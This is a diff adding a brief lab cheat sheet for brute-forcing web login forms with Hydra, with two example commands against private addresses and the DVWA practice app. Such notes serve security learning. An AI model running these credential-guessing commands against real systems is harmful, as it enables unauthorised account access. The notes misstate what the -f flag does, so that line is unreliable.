@@ -1,0 +1,21 @@
+hydra [-l login | -L file][-p Pass| -P File][-u][-f][IP][-s Port][MODULE][url]:[form parameters]:[condition string] 
+
+Module means --> http, ssh etc.... 
+
+-f ---> Domain Name or IP
+-s ---> Port Number 
+
+NOTE :- Use Burpsuite and F12 to identify key info to use for the above hydra command... 
+
+BurpSuite HTTP Proxy info --> 127.0.0.1:8080
+Firefox settings --> search for proxy and click on settings for the first option.
+
+
+Example code --> sudo hydra -l sidhaant -P /opt/passwords.txt -u -f 192.168.1.9 -s 8080 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
+
+
+Another example:-
+
+Note:- CHECK BURPSUITE TARGET TAB to check the module being used.
+
+hydra 192.168.1.9 http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&Login=submit" -L usernames.txt -P passwords.txt 
